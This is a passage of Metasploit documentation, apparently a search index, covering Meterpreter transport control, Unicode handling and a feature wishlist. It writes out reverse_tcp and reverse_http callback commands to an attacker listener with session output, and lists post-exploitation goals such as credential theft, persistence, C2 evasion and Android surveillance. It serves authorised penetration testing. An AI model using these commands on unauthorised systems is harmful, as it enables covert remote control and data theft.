specifies a proxy host/IP. This parameter is optional. | The -B option specifies a proxy type, and needs to be set to http or socks. If not specified alongside the -H parameter, the default type is http. | The -P option specifies the port that the proxy is listening on. This should be set when -H is set. | The -U option specifies the username to use to authenticate with the proxy. This parameter is optional. | The -N option specifies the password to use to authenticate with the proxy. This parameter is optional. | The -X option specifies the overall Meterpreter session timeout value. While this value is not transport-specific, the option is provided here so that it can be set alongside the other transport-specific timeout values for ease of use. | Finally the -c parameter can be used to indicate the expected SSL certificate. This parameter expects a file path to an SSL certificate in PEM format. The SHA1 hash of the certificate is extracted from the file, and this is used during the request validation process. If this file doesn’t exist or doesn’t contain a valid certificate, then the request should fail. | . The following shows another example which adds another reverse_tcp transport to the transport list: . meterpreter &gt; transport add -t reverse_tcp -l 10.1.10.40 -p 5005 [*] Adding new transport ... [+] Successfully added reverse_tcp transport. meterpreter &gt; transport list Session Expiry : @ 2015-06-09 19:56:05 Curr URL Comms T/O Retry Total Retry Wait ---- --- --------- ----------- ---------- * tcp://10.1.10.40:6000 300 3600 10 http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/ 100000 50000 2500 tcp://10.1.10.40:5005 300 3600 10 . Note that these examples only add new transports, they do not change the current transport mechanism. When a transport is added to the list of transports, they are always added at the end of the list, and not the start. Change transports . There are three different ways to change transports. One thing they do have in common is that transport switching assumes that you have listeners set up to receive the connections. If no listener or handler is present, then the resiliency features in Meterpreter will cause it to constantly attempt to establish connectivity on that transport using the transport timeout values that were configured. If the transport ultimately fails, then Meterpreter will cycle to the next transport on the list and try again. This will continue until a transport connection is successful, or the session timeout expires. More information on this can be found in the session resiliency documentation (link coming soon). The three different ways to change transports are: . | transport next - This command will cause Meterpreter to shut down the current transport, and attempt to reconnect to Metasploit using the next transport in the list of transports. | transport prev - This command is the same as transport next, except that it will move to the previous transport on the list, and not the next one. | transport change ... - This command is equivalent to running transport add, and requires all the parameters that transport add requires (resulting in a new transport at the end of the list), and then transport prev (which is the same as going from the start of the list to the end). The net effect is the same as creating a new transport and immediately switching to it. | . As an example, here is the current transport setup: . meterpreter &gt; transport list Session Expiry : @ 2015-06-09 19:56:05 Curr URL Comms T/O Retry Total Retry Wait ---- --- --------- ----------- ---------- * tcp://10.1.10.40:6000 300 3600 10 http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/ 100000 50000 2500 tcp://10.1.10.40:5005 300 3600 10 . Moving to the next transport: . meterpreter &gt; transport next [*] Changing to next transport ... [+] Successfully changed to the next transport, killing current session. [*] 10.1.10.35 - Meterpreter session 1 closed. Reason: User exit msf exploit(handler) &gt; [*] 10.1.10.40:46130 (UUID: 8e97549ed2baf6a8/x86_64=2/windows=1/2015-06-02T09:56:05Z) Attaching orphaned/stageless session ... [*] Meterpreter session 2 opened (10.1.10.40:5105 -&gt; 10.1.10.40:46130) at 2015-06-02 20:53:54 +1000 msf exploit(handler) &gt; sessions -i 2 [*] Starting interaction with 2... meterpreter &gt; transport list Session Expiry : @ 2015-06-09 19:56:05 Curr URL Comms T/O Retry Total Retry Wait ---- --- --------- ----------- ---------- * http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/ 100000 50000 2500 tcp://10.1.10.40:5005 300 3600 10 tcp://10.1.10.40:6000 300 3600 10 . This output shows that we moved from the original reverse_tcp to the reverse_http transport, and this is now the current transport. Moving to the next transport again takes the session to the second reverse_tcp listener: . meterpreter &gt; transport next [*] Changing to next transport ... [+] Successfully changed to the next transport, killing current session. [*] 10.1.10.35 - Meterpreter session 2 closed. Reason: User exit msf exploit(handler) &gt; [*] Meterpreter session 3 opened (10.1.10.40:5005 -&gt; 10.1.10.35:49277) at 2015-06-02 20:54:45 +1000 msf exploit(handler) &gt; sessions -i 3 [*] Starting interaction with 3... meterpreter &gt; transport list Session Expiry : @ 2015-06-09 19:56:06 Curr URL Comms T/O Retry Total Retry Wait ---- --- --------- ----------- ---------- * tcp://10.1.10.40:5005 300 3600 10 tcp://10.1.10.40:6000 300 3600 10 http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/ 100000 50000 2500 . From here, moving backward sends Meterpreter back to the reverse_http listener: . meterpreter &gt; transport prev [*] Changing to previous transport ... [*] 10.1.10.40:46245 (UUID: 8e97549ed2baf6a8/x86_64=2/windows=1/2015-06-02T09:56:05Z) Attaching orphaned/stageless session ... [+] Successfully changed to the previous transport, killing current session. [*] 10.1.10.35 - Meterpreter session 3 closed. Reason: User exit msf exploit(handler) &gt; [*] Meterpreter session 4 opened (10.1.10.40:5105 -&gt; 10.1.10.40:46245) at 2015-06-02 20:55:07 +1000 msf exploit(handler) &gt; sessions -i 4 [*] Starting interaction with 4... meterpreter &gt; transport list Session Expiry : @ 2015-06-09 19:56:05 Curr URL Comms T/O Retry Total Retry Wait ---- --- --------- ----------- ---------- * http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/ 100000 50000 2500 tcp://10.1.10.40:5005 300 3600 10 tcp://10.1.10.40:6000 300 3600 10 . Remove transports . It is also possible to remove transports from the underlying transport list. This is valuable in cases where you want Meterpreter to always callback on stageless listeners (allowing you to avoid the unnecessary upload of the second stage), or when you have a listener located at an IP address that may have been blacklisted by your target as a result of your post-exploitation shenanigans. The command is similar to add in that it takes a subset of the parameters, and then adds a new one on top of it: . | -t - The transport type. | -l - The LHOST value (unless it’s bind_tcp). | -p - The LPORT value. | -u - This value is only required for reverse_http/s transports and needs to contain the URI of the transport in question. This is important because there might be multiple listeners on the same IP and port, so the URI is what differentiates each of the sessions. | . [*] Starting interaction with 2... meterpreter &gt; transport list Session Expiry : @ 2015-07-10 07:39:08 Curr URL Comms T/O Retry Total Retry Wait ---- --- --------- ----------- ---------- * tcp://10.1.10.40:5000 300 3600 10 http://10.1.10.40:9090/jYGS61OX8On-Dv8Pq5v9FAJAEobAlrL4J2FBOf_3DsnZzCJAY6-Dh_8AeWdrkFwRbQdvz4vOo8let4huygVLPJ/ 300 3600 10 meterpreter &gt; transport remove -t reverse_http -l 10.1.10.40 -p 9090 -u jYGS61OX8On-Dv8Pq5v9FAJAEobAlrL4J2FBOf_3DsnZzCJAY6-Dh_8AeWdrkFwRbQdvz4vOo8let4huygVLPJ [*] Removing transport ... [+] Successfully removed reverse_http transport. meterpreter &gt; transport list Session Expiry : @ 2015-07-10 07:39:08 Curr URL Comms T/O Retry Total Retry Wait ---- --- --------- ----------- ---------- * tcp://10.1.10.40:5000 300 3600 10 meterpreter &gt; . Resilient transports . Previously, Meterpreter only had built-in resiliency in the HTTP/S payloads and this was due to the nature of HTTP/S as a stateless protocol. Meterpreter now has resiliency features baked into TCP transports as well, both reverse and bind. If communication fails on a given transport, Meterpreter will roll over to the next one automatically. The following shows Metasploit being closed and leaving the existing TCP session running behind the scenes: . meterpreter &gt; transport list Session Expiry : @ 2015-06-09 19:56:05 Curr URL Comms T/O Retry Total Retry Wait ---- --- --------- ----------- ---------- * tcp://10.1.10.40:6000 300 3600 10 http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/ 100000 50000 2500 tcp://10.1.10.40:5005 300 3600 10 meterpreter &gt; background [*] Backgrounding session 5... msf exploit(handler) &gt; exit -y . With Metasploit closed, the Meterpreter session has detected that the transport is no longer functioning. Behind the scenes, Meterpreter has shut down this TCP transport, and has automatically moved over to the HTTP transport as this was the next transport in the list. From here, Meterpreter continues to try to re-establish connectivity with Metasploit on this transport a per the transport timeout settings. The following output shows Metasploit being re-launched with the appropriate listeners, and the existing Meterpreter instance establishing a session automatically: ./msfconsole -r ~/msf.rc [*] Starting the Metasploit Framework console...| IIIIII dTb.dTb _.---._ II 4' v 'B .'\"\".'/|\\`.\"\"'. II 6.P : .' / | \\ `. : II 'T;.;P' '.' / | \\ `.' II 'T; ;P' `. / | \\ .' IIIIII 'YvP' `-.__|__.-' I love shells --egypt =[ metasploit v4.11.0-dev [core:4.11.0.pre.dev api:1.0.0]] + -- --=[ 1460 exploits - 835 auxiliary - 229 post ] + -- --=[ 426 payloads - 37 encoders - 8 nops ] + -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ] ... snip ... [*] 10.1.10.40:46457 (UUID: 8e97549ed2baf6a8/x86_64=2/windows=1/2015-06-02T09:56:05Z) Attaching orphaned/stageless session ... [*] Meterpreter session 1 opened (10.1.10.40:5105 -&gt; 10.1.10.40:46457) at 2015-06-02 21:03:55 +1000 msf exploit(handler) &gt; sessions -l Active sessions =============== Id Type Information Connection -- ---- ----------- ---------- 1 meterpreter x86/win32 WIN-S45GUQ5KGVK\\OJ @ WIN-S45GUQ5KGVK 10.1.10.40:5105 -&gt; 10.1.10.40:46457 (10.1.10.35) msf exploit(handler) &gt; sessions -i 1 [*] Starting interaction with 1... meterpreter &gt; transport list Session Expiry : @ 2015-06-09 19:56:05 Curr URL Comms T/O Retry Total Retry Wait ---- --- --------- ----------- ---------- * http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/ 100000 50000 2500 tcp://10.1.10.40:5005 300 3600 10 tcp://10.1.10.40:6000 300 3600 10 . The session is back up and running as if nothing had gone wrong. In the case where Meterpreter is configured with only a single transport mechanism, this process still takes place. Meterpreter’s transport list implementation is a cyclic linked-list, and once the end of the list has been reached, it simply starts from the beginning again. This means that if there’s a list of one transport then Meterpreter will continually attempt to use that one transport until the session expires. This works for both TCP and HTTP/S. For important detail on network resiliency, please see the reliable network communication documentation. ",
    "url": "/docs/using-metasploit/advanced/meterpreter/meterpreter-transport-control.html#the-transport-command",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/meterpreter-transport-control.html#the-transport-command"
  },"459": {
    "doc": "Transport Control",
    "title": "Supported Meterpreters",
    "content": "The following Meterpreter implementations currently support the transport commands: . | Windows x86 | Windows x64 | POSIX x86 | Android | Java | Python | . ",
    "url": "/docs/using-metasploit/advanced/meterpreter/meterpreter-transport-control.html#supported-meterpreters",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/meterpreter-transport-control.html#supported-meterpreters"
  },"460": {
    "doc": "Transport Control",
    "title": "Transport Control",
    "content": " ",
    "url": "/docs/using-metasploit/advanced/meterpreter/meterpreter-transport-control.html",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/meterpreter-transport-control.html"
  },"461": {
    "doc": "Unicode Support",
    "title": "Unicode Support",
    "content": "Until recently (April 2015), Meterpreter always sent string data in whatever the system encoding happened to be. With the TLV protocol, the TLV_TYPE_STRING was treated roughly as a plain C byte array, with no real expectations as to how the data should be decoded on the Meterpreter or Metasploit framework sides. As a result, type confusion occurred between different locales on remote machines and the local console. To avoid corrupting the terminal due to mistaken character encoding interpretations, Metasploit framework implements Unicode filter that converts any possibly unprintable characters into hex strings. While this allows a sufficiently-advanced human to eyeball a string for meaning, it makes dealing with Unicode strings awkward. To solve the problem, TLV_TYPE_STRING has been retroactively declared to mean UTF-8 encoding only. All Meterpreter implementations should send UTF-8 strings and expect them in requests. On Windows systems, this means that Meterpreter needs to convert to and from Windows’ UTF-16LE implementation. So far, the Filesystem operations on all Meterpreters have been converted to expect a and send UTF-8 strings. Only the PHP meterpreter on Windows lacks Unicode support, due to limitations in PHP itself. All new TLVs should send and receive UTF-8. There is still functionality, that needs conversion beyond the Filesystem APIs, and these can be loosely discovered with a command like grep -R A\\( * to find all ASCII variants of functions called by meterpreter. In the Windows C meterpreter, there are a couple of helper functions to simplify the conversion work: . wchar_t *utf8_to_wchar(const char *in); char *wchar_to_utf8(const wchar_t *in); . These functions both allocate a new string as their return value, so the strings should be freed after use by the caller. Here is an example of a function expanding a path and performing the conversion to and from UTF-8: . char * fs_expand_path(const char *regular) { wchar_t expanded_path[FS_MAX_PATH]; wchar_t *regular_w; regular_w = utf8_to_wchar(regular); if (regular_w == NULL) { return NULL; } if (ExpandEnvironmentStringsW(regular_w, expanded_path, FS_MAX_PATH) == 0) { free(regular_w); return NULL; } free(regular_w); return wchar_to_utf8(expanded_path); } . Unicode support in Metasploit framework today is enabled by default on Linux/Unix systems, since most modern terminal emulators have no trouble displaying the characters. However, on Windows, most native terminal emulators ironically have trouble working with more than one language at once, due to historical code page support. So, for Windows, Unicode characters are still filtered by default. Setting EnableUnicodeEncoding to false will allow the native characters to be emitted by the Metasploit console. ",
    "url": "/docs/using-metasploit/advanced/meterpreter/meterpreter-unicode-support.html",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/meterpreter-unicode-support.html"
  },"462": {
    "doc": "Wishlist",
    "title": "Wishlist",
    "content": "This document is our live wishlist of features and changes for the Metasploit Meterpreter payloads. The majority of this list came from a survey sent out to the community in early 2015. If you plan to work on one of these features, please add a note to the item, and reference any open tickets or pull requests that are relevant. This document only contains survey suggestions that were specific to Meterpreter. Duplicate and similar items have been combined. Items currently in development have been marked [IN PROGRESS] . Items landed to master have been marked [DONE] . Related open tickets (slightly broader than Meterpreter): . | Make User-Agent easier to control across modules and more consistent | Comprehensively refactor Windows reverse_http stagers | Python reverse HTTPS stager | Port windows reverse_tcp &amp; bind_tcp to Metasm | . Meterpreter Platform Support . | Mac Meterpreter | iOS Meterpreter | PHP Meterpreter should have equivalent functionality to Win32 | Python Meterpreter should have equivalent functionality to Win32 | POSIX Meterpreter should have equivalent functionality to Win32 (extract it from Win32 codebase) | Powershell Meterpreter | Some users indicated that the Python/PHP Meterpreters were important because the POSIX/Linux Meterpreter was not working for them | . Mimikatz Integration . | In-memory pass-the-hash (basically this runs a process as “netonly” I believe, then injects real credential hashes supplied by the user in order to perform network based auth to things with only a hash) | Exporting of certificates, keys, and tickets in base64 format (already supported) then down to real files on disk for the attacker info | Add on-target minidump extraction | Add sekurla::searchpasswords | Expand mimikatz and contribute back to it | Integration of Mimikatz with the credential database | Latest version of Mimikatz to be used as the plugin | It would be great to have a method to generate a golden ticket for a specific period of time (month, 6-months, year) rather than only 10 years. | . Meterpreter Pivoting . | VPN Pivoting for Framework (WinPcap still better than nothing) | Reverse pivoting from the target machine back to the attacker (TCP/UDP) . For many years I’ve asked for this feature. Basically Meterpreter needs to be able to say, listen on port 8080 on victim 1 and it go through the Meterpreter session to port whatever (9060) on the attacker’s machine or a designated alternate IP. then, whenever someone hits that port it’s auto forwarded through the session. This could help out a lot for SMB capture, Post exploitation phishing, and other things like setting a user’s proxy to use your forwarded port instead of the corporate proxy. | Improved pivoting speed and latency | Pivoting that is reliable and works well with different transports. In particular, I want the ability to pivot one session through another even if the first session is reverse_tcp or reverse_https, regardless of the second sessions transport. This will be difficult without installing drivers, but I would like several useful, working transports that I know I can pivot reliably with. | Carry portforwards and other channels along with a migrate. | . Privilege Escalation . | Allow privilege escalation modules to increase the privileges of the current session instead of firing off a new session. | Automated privesc for all platforms - not just Windows. | Implement a “privup” command that is similar to getsystem which automatically tries to get higher privs using local exploits. Allow the user to specify a “force” flag to automatically try “dangerous” privilege escalations (kernel mode, etc) | Make the “local” modules more seamlessly accessible inside Meterpreter without requiring sending your session to background and running a local module separately against it.Would be nice to have a built-in Meterpreter command called “local” with tab complete that would list the local modules relevant to that platform/arch - then running one of the local modules auto selects your current session, spawns a new metepreter session and transfers you over to that session automatically if successful with a clear message/indication that your now in a new elevated Meterpreter session. | . Remote File Access . | [DONE] Console/Meterpreter: Support for uploading, downloading, deleting, renaming, and listing files using UTF-8 input and showing UTF-8 output, converting this in the Meterpreter payload as necessary to support accessing unicode paths on the target. | [DONE] Console: The ls command should support wildcards in the directory listing, ex: ls *.csv | [DONE] Console: The ls command should support sorting files by date, name, or size | [DONE] Console: The ls command should support listing MSDOS 8.3 (short) names if available on Windows | [DONE] Console: The download command should support filtering files based on a wildcard match (recursively, too) | [DONE] Console: The download command should mirroring an entire remote file system to a local directory (names, paths, and timestamps) | . Meterpreter Features . | Direct Powershell integration on Windows (load &amp; run .NET runtimes from inside Meterpreter) | Remote (target-side) scripting | Builtin userland persistence | Builtin rootkit/bootkit payload persistence | Create payloads that only “install” on specific computers (based on hardware, windows domain, etc) | Acquire a physical RAM image without touching the disk. This currently requires uploading winpmem[64].sys to windows\\system32 and invoking it through post/windows/manage/driver_loader. As loaded winpmem.sys exposes the RAM as disk device I can then suck it through post/windows/manage/nbd_server. Please make this possible without dropping winpmem.sys to system32 folder if possible | Manage multiple Meterpreter processes as one session as described in #4715. Many times there have been situations where a keyscan, or sniffer was going and something else occurred that required migration or cancelling to perform an action. “Installing” jobs in processes less likely to die would allow a pentester to still move around as needed but also be able to have persistent tasks going. A pipe dream of this feature would be to install a “rev2system” jobs whereby I could migrate to a low priv status for accessing Cryptolib encrypted storage but also get back to SYSTEM when I’m done without needing to pop a shell again. Another pipe dream here would be to also have jobs that if the user logged out, then back in the next day and I had a shell come back then, I could re-attach to my running jobs and get their results . | PrependTokenSteal / PrependEnvironmentSteal: Basically with proxies and other perimeter defenses being SYSTEM doesn’t work well. This would be an addition to a payload that would work to execute as SYSTEM but would then locate a logged in user and steal their environment to call back to the handler. Very useful when pivoting around with PSEXEC | Binary installed death dates: A way putting a date in a binary where after that date the binary no longer functions would be useful and possibly even perform self-deletion. Time zones would be a tricky matter, but is something handled by many programmers already (probably just not in shellcode) | Allow Meterpreter sesssions to resolve L3 addresses (#4793) | Track whether or not the current session has admin credentials (#4633)d | Support Metasploit-side zlib compression of sessions | Being able to use Meterpreter instances to easily forward commands &amp; exfil | Automatic cleanup and removal of session and any recorded persistence after predetermined amount of time (server-side) | Change desktop/phone background | Remote mouse control | Play sound on the remote system | Read words outloud via text to speech on the remote system | Volume control | RSS feed from reverse_http(s) mult-handler that I can connect a RSS reader to (or something like IFTTT) and get notices when new sessions are created | MessageBox popups | Call the system “open” command easily (ShellExecute on windows, launch intent on Android) | Gather credentials from Google Chrome | LNK (binary) modification: Editing a LNK file’s ICON location (for SMB capturing), “Starting Directory” (for DLL injection) or target binary would make some post exploitation tasks easier | “Pinned” app modification: Knowing which apps are pinned, and what they link to (be it taskbar or start menu) would be useful intelligence, but also being able to modify the target of these links would be better and a very easy user-land persistence. (Run this &amp;&amp; the real thing you want) | Remote Registry automation: Remotely editing or reading the registry of a remote system works currently (sometimes) but it has no smarts about if the Remote Registry service is on or not. It would be nice to automate the starting and stopping of the remote registry service as well as possibly warning the user if they are attempting to do this as SYSTEM (probably going to fail). The use case for this is installing persistence on lots of systems quickly as well as reading user lists, MRUs and other intelligence important keys. (like finding a system with the puTTY keys) | “ps” and “kill” for remote systems: This would remove the need to drop to a shell and attempt to remember how to format “taskkill” and “tasklist”’s argument list. Tasklist also automatically removes the IPC$ connection after it’s done so results in some annoying disconnected share viewing | Scheduled Tasks / AT: Many of the ways to pivot or stay persistent use AT or Scheduled Tasks, to do so. This functionality to do tasks both locally and on remote hosts would greatly decrease the number of times a pentester would need to drop to cmd.exe | [DONE] Execute with login credentials: When a user is no longer online it is overkill to PSEXEC (which would just net a SYSTEM shell anyways with MSF) and “RunAs” isn’t supported since it requires a password at a prompt, so adding a simple CreateProcesWithLogon feature would help with reviving dead tokens #4649 | ListDrives: Most of the time shares and other drives rather than just C:\\ are where important files are stored. This feature would list local storage (plus USB) and network storage (SMB connected drives with where they are connected from and as what user) to start, but this feature would need to grow to support “Cloud” drives as well, like Dropbox, Box, Google Drive, and SkyDrive. | Enumerables support in Railgun: Windows is full of “Enumerables” like EnumWindows that would be nice to have the ability to create code for. That example is bad since ExtAPI has EnumWindows now but the argument doesn’t go away for railgun | DACL / Permissions enumeration: This is just needed in general for privilege escalation enumeration, share permissions, and reporting (“Why did you have access to this share, it was only supposed to be for X”) | Gina/SSP support: This would probably need to be an injected “job” but the basic premise is an in-memory load of a SSP or inject into Gina so when a new login happens against the system a set of clear text credentials are captured. 2 extremely use cases would be on a terminal server, or a server that no one is logged into at the time of infection due to time zone or operating hour differences | Websnapshot: Currently there isn’t a way to weed out web applications once in a network. This feature would, using IE, or another method be able to generate a screenshot of what a page looks like in a browser (given a PROTOCOL/URL/PORT). Biggest requirement is auto-accepting any self signed SSL certs and showing when authentication is required. | On-target resource cloning: Allowing a pentester to drop a binary and clone the ICON (in particular) of a binary would add to the stealthiness of an operation and add attack opportunities that weren’t previously thought plausible | Scatterbomb: Persistence is difficult, and making sure your session doesn’t die because you chose the wrong process to migrate into or the user exited that process because the PDF looked hung. This would work by attempting OpenProcess on every process or a select list of processes and inject Meterpreter threads into them. But it would rely on the Mutex feature so that only one would be calling back at a time. Basically allowing for a resilient semi-persistent Meterpreter session that would save you from yourself when you accidentally type exit on the Meterpreter&gt; prompt instead of your other terminal | Mutex checking binary exports: This follows up with the scatterbomb but essentially when installing persistence as a pentester I only install one because installing more than one would raise the noise level of a compromised host. If the binary/callback would check a mutex before doing anything and looping based on a timeout that even better. | OLE / Office Controls: This is basically an open ended feature request asking for support of for Office, mostly Outlook (like read newest emails, search email, etc). | Configurable character set conversation for Shell sessions and channels. When spawning a windows shell from meterpreter, on a host that uses a German version of windows, all the special characters (e.g. öäü) are broken, i.e. they are either not rendered at all, or replaced with that default “character not found” unicode character. Forcing the terminal emulator to use cp850 made it work for now. | . Metepreter Stager Support . | [DONE] Network error tolerant versions of existing stagers | [DONE] Tagged stagers that send the payload type, arch, platform during the staging process to enable shared listeners | [DONE] Stagers that contain an embedded unique ID that can be used to identify which payload triggered what session | [DONE] Stagers that are “stageless” for Meterpreter (include the entire main Meterpreter payload, plus any required extensions). In situations of high network latency or extreme network detection a non-staged exe is the only way to go. Ulta-met is a project that does this but isn’t as stable or easy to work with as if it were just built into the binary creation options. | [DONE] Stagers that are “stageless” for Meterpreter and include all potential functionality (all extensions) | . Meterpreter Transport Flexibility . | [DONE] Support for changing the transport (host, port, URL) of a live session to a new endpoint or protocol | [DONE] Support for multiple transports for the initial session, using the first transport that works | [DONE] Support for multiple endpoints across multiple transports for the initial session | [DONE] Support for automatic switching between multiple transports while the session is running | [DONE] Support for user-configured callback frequency and endpoint rotation | Support for Tor tunneling to .onion and internet-facing listeners | Support for time-based callback, such as limiting callbacks to certain times of the day. | Support for P2P style callbacks. Gossip protocol to find other Meterpreters on the network and use them as exfiltration point. This callback would reduce the amount of endpoints that would call “out” to a handler to 1. Whoever the “master” was. All comms would automatically (because, math) find and delegate this master and finally send through the master all of their comms. This could happen over a named pipe, or a forwarded port or something. (DHT?) | Support for DNS A/TXT transports | Support for UDP transports | Support for ICMP transports | Support for TLS encrypted bind listeners | Support for HTTP application listener (ie CGI mode Meterpreter session, tomcat servlets, etc) | Support for third-party communication transports (Github, Twitter, pastebin, etc) | Support for XMPP transports. Many organizations use IM and chat clients internally and support them going outbound. reverse_tcp being stopped for the most part these days and more and more catching reverse_http(s) due to proxies, this might become the next outlet. Possibly using server that are already established in the industry ;-) but mainly supporting XYZ jabber server as a pass through. This would probably be a very big piece of shellcode as I don’t believe any Windows OSs support XMPP out of the box. | Support for IE callback: One method deployed by some more infamous malware is to only communicate when IE is running and surfing and only by hooking IE to send comms. This callback would operate very much the same and would support any kind of proxy by default as IE does. | Support for Outlook callback: This callback would use email back and forth either directly to a MSF run SMTP server or through other services, but the C2 channel would be locally (not on the exchange filter system) auto-filtered to a non-visible folder (using PidTagAttributeHidden). This type of comms would greatly increase the lag time supported in Metepreter simply due to the inherent lag in email. | . Meterpreter HTTP Transport Options . | [DONE] Create a whitelist of allowed URLs on the handler, have these persistent between metasploit runs | [DONE] Indicate whether a given handler should silently accept, accept and report, or drop connections using unregistered URLs | [DONE] Whitelisted URLs should be referencing using an alias, stored persistently with the URL | [DONE] Session listing output should indicate what URL and URL alias a particular session is associated with | [DONE] URLs can be anywhere from 30 to 128 bytes long | . Meterpreter Proxy Support . | [DONE] Use Windows Credentials with NTLM Authentication to connect via System Proxy back to attacker | If Meterpreter executes as system - option to find a user, and use that users proxy settings for comms (temporarily or cleanup on exit) - maybe something like RunAsCurrentUser | [DONE] Better proxy support and the ability to sleep. Still more to done on burstable updates | . Communication Protection . | Authenticated callbacks: This is pretty straight forward, when a pentester no longer controls the IP they were attacking from and failed to clean up every binary and phishing email there is a chance of compromise by proxy. The problem was somewhat solved with SessionExpirationTimeout and SessionCommunicationTimeout but both of them are loaded in the stage, not hard coded into any binary built, so it’s very easy to get into this situation. Authenticated callbacks would allow a pentester to add a small layer of protections if this event were to happen and a callback from a client was sent to an IP no longer in the pentester’s control | Embedded TLS cert or hash of cert to verify Meterpreter instance on the Metasploit side | [DONE] Embedded TLS cert or hash of cert to verify Metasploit instance on the Meterpreter side | Embedded password to verify Meterpreter instance on the Metasploit side (challenge-response) | Embedded password to verify Metasploit instance on the Meterpreter side (challenge-response) | [DONE] Enable TLS verification to verify Metasploit instance on the Meterpreter side | [DONE] Allow open, relaxed, strict modes of payload authentication (everything, everything but flag unauthorized, drop non-authorized) | . Communications Evasion . | Emulation of common web application traffic when using HTTP-based transports | Change web application traffic emulation fingerprints on the fly when using HTTP-based transports | [DONE] Sleeping for a specified period of time before reconnecting to Metasploit | [DONE] Automatic shutdown/cleanup after a specified amount of time has passed | Traffic shaping or malleable communications, especially for HTTP(S), can be very useful for blending in, or even for adversary simulation. See Maligno (OSS - http://www.encripto.no/tools/) | Malleable network signatures in general | Malleable file artefacts - Make Meterpreter look like PlugX / Poison Ivy / etc. | Stealthier network comms (C2 DLL inject into web browser) | Better support to automatically identify applications that use a corporate proxy that allows outside connections and then leverage this application’s features | Emulate various real world malware | Being able to use Meterpreter instances to easily forward commands &amp; exfil | Supporting a set URI path for reverse_http(s), so you can use other webservers as a reverse proxy. | . Session Handlers . | [DONE] Generate a unique ID for each session (target-side) | [DONE] Generate a unique ID for each generated payload Backdooring/Persisting on more than 10 machines over months it gets very difficult to know when a host hasn’t called back in a while or when a new host arrives. This would need not to be based on gateway, local IP, or any other transient information. This can be processed at any step as long as when STDAPI is loaded I can quickly identify if it’s a system that I’ve known about, and how long it’s been since I’ve seen it. | Shared listeners that can stage multiple payload architectures and platforms (using tags). Depends on new stagers and a new listener and unique IDs. [IN PROGRESS] | [DONE] Track the last time a given session checked in | Track user defined state data in the db, such as specific user / member of group logged in, specific shares open, certain tuple of IP:port in network connections (1.2.3.4 over 22 where 1.2.3.4 is an IP of interest) | Reconnecting payloads will have different IPs, take this into account for session methods (peerinfo/tunnelinfo, etc) | . Session Reliability . | [DONE] Metasploit payloads should always restore connections if there is a network error unless the user explicitly kills the session | Improve reliability, encryption, authentication. Better integration for custom payloads. | Spawn a new session before running a module that could crash the current session (mostly privilege escalation, but some buggy post modules too [railgun]) | Meterpreter should work robustly in a VM, on a cloud server, or through corp proxies | . Android Meterpreter Features . | Android gather modules for auth tokens &amp; sqlite databases (call logs, contacts, email, etc) | [DONE] Android lock screen removal | Crack the lock screen hash to reveal the password, pin code or gesture | Remote screen control | Add record_mic_stream (trigger based on event, like phone call) | [DONE] Grab photos from front and rear cameras | Android desktop background, sound play, vibrate, screenshot | [DONE] Quickly grab GPS coordinates | Windows post module to install Meterpreter on any attached android devices | Better pivoting (e.g bridging between WiFi and 4g) | More root exploits | Dump browsing history and cookies | Comprehensive test suite (including rspec) | ARM/POSIX Meterpreter | [DONE] Support for native payloads in the addJavascriptInterface exploit | . Payload Generation . | Msfvenom should support injecting into existing APKs for Android Meterpreter deployment. Otherwise, it’s just an app the target installs for 10 seconds and removes after confirming it has no user interface, barely allowing the Meterpreter session to be created. [IN PROGRESS] | Msfvenom really needs to spit out some C# payloads. You can pretty easily modify some of the powershell ones to be C#, but there really ought to be a built in C# payload. | [DONE] Generated payloads should default to exiting the process when the shellcode completes | [DONE] Payload generation should allow named UUIDs to be injected into payloads | . Unit testing for payloads . | Metasploit payload classes should have specs, new specs should be created when any class is changed if there isn’t an existing spec. | Metasploit payload tests that can run in Travis, should be automatically tested end-to-end | Metasploit payload tests that can’t run in Travis should be run by Jenkins and target a virtual machine (local or cloud-hosted). | Meterpreter payloads should test every advertised console command. | Meterpreter payloads should test a subset of the full APIs available. | . Meterpreter Specifications . | These define compatibility, quality, and order of preference for Meterpreter payload modules, including stages and stages. | Payload Flags (for matching with exploits/generators/handlers): . | Supports SSL | Supports ZLIB | Staged / Unstaged | . | Quality Rank (for prioritizing bugs/feature work): . | Leverage using Rank system | Windows: Excellent | Python: Great | Java: Good | PHP: Normal | POSIX: Normal | . | Capabilities (queried post-stage to determine features): . | Filesystem | Registry | Pivoting (sockets) | Pivoting vpn) | Process listing, kill, execute | Process memory read, write, injection | Migration | . | . ",
    "url": "/docs/using-metasploit/advanced/meterpreter/meterpreter-wishlist.html",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/meterpreter-wishlist.html"
  },"463": {
    "doc": "Overview",
    "title": "Architecture",
    "content": "To avoid confusion, the victim running meterpreter is always called the server and the ruby side controlling it is always called the client, regardless of the direction of the network transport connection. The Meterpreter server is broken into several pieces: . | metsrv.dll and meterpreter.{jar,php,py} - this is the heart of meterpreter where the protocol and extension systems are implemented. | ext_server_stdapi.{dll,jar,php,py} - this extension implements most of the commands familiar to users. | ext_server_*.{dll,jar,php,py} - other extensions provide further functionality and can be specific to particular environments. | . ",
